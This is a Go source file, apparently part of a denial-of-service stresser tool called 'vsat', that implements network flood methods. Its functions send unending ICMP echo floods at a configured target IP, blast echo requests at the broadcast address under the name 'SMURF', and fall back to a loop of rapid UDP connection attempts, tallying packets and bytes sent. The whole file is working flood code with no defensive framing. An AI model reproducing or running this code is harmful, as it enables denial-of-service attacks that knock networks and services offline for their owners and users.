package l3

import (
	"encoding/binary"
	"fmt"
	"net"
	"time"

	"github.com/MatrixTM26/vsat/internal/methods"
	"github.com/MatrixTM26/vsat/internal/random"
)

func BuildICMPPacket(TypeCode byte, PayloadSize int) []byte {
	Payload := random.RandomBytes(PayloadSize)
	Pkt := make([]byte, 8+len(Payload))
	Pkt[0] = TypeCode
	Pkt[1] = 0
	binary.BigEndian.PutUint16(Pkt[4:6], uint16(random.RandomInt(1, 65535)))
	binary.BigEndian.PutUint16(Pkt[6:8], 1)
	copy(Pkt[8:], Payload)
	Cksum := random.CalculateChecksum(Pkt)
	binary.BigEndian.PutUint16(Pkt[2:4], Cksum)
	return Pkt
}

func ICMPExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	Conn, Err := net.ListenPacket("ip4:icmp", "0.0.0.0")
	if Err != nil {
		ICMPFallback(Cfg, Stop)
		return
	}
	defer Conn.Close()

	DstAddr := &net.IPAddr{IP: net.ParseIP(Cfg.IP)}

	for {
		select {
		case <-Stop:
			return
		default:
		}
		Pkt := BuildICMPPacket(8, random.RandomInt(64, 1400))
		N, Err := Conn.WriteTo(Pkt, DstAddr)
		if Err == nil {
			Cfg.Stats.RequestsCount.Add(1)
			Cfg.Stats.BytesSent.Add(int64(N))
		}
	}
}

func SMURFExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	Conn, Err := net.ListenPacket("ip4:icmp", "0.0.0.0")
	if Err != nil {
		return
	}
	defer Conn.Close()

	BcastAddr := &net.IPAddr{IP: net.ParseIP("255.255.255.255")}

	for {
		select {
		case <-Stop:
			return
		default:
		}
		Pkt := BuildICMPPacket(8, random.RandomInt(512, 1400))
		N, Err := Conn.WriteTo(Pkt, BcastAddr)
		if Err == nil {
			Cfg.Stats.RequestsCount.Add(1)
			Cfg.Stats.BytesSent.Add(int64(N))
		}
	}
}

func PINGExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	Conn, Err := net.ListenPacket("ip4:icmp", "0.0.0.0")
	if Err != nil {
		ICMPFallback(Cfg, Stop)
		return
	}
	defer Conn.Close()

	DstAddr := &net.IPAddr{IP: net.ParseIP(Cfg.IP)}

	for {
		select {
		case <-Stop:
			return
		default:
		}
		Pkt := BuildICMPPacket(8, 64)
		N, Err := Conn.WriteTo(Pkt, DstAddr)
		if Err == nil {
			Cfg.Stats.RequestsCount.Add(1)
			Cfg.Stats.BytesSent.Add(int64(N))
		}
		time.Sleep(time.Millisecond)
	}
}

func ICMPFallback(Cfg *methods.Config, Stop <-chan struct{}) {
	Addr := fmt.Sprintf("%s:%d", Cfg.IP, Cfg.Port)
	for {
		select {
		case <-Stop:
			return
		default:
		}
		Conn, Err := net.DialTimeout("udp", Addr, 2*time.Second)
		if Err != nil {
			time.Sleep(10 * time.Millisecond)
			continue
		}
		Conn.Close()
		Cfg.Stats.RequestsCount.Add(1)
	}
}
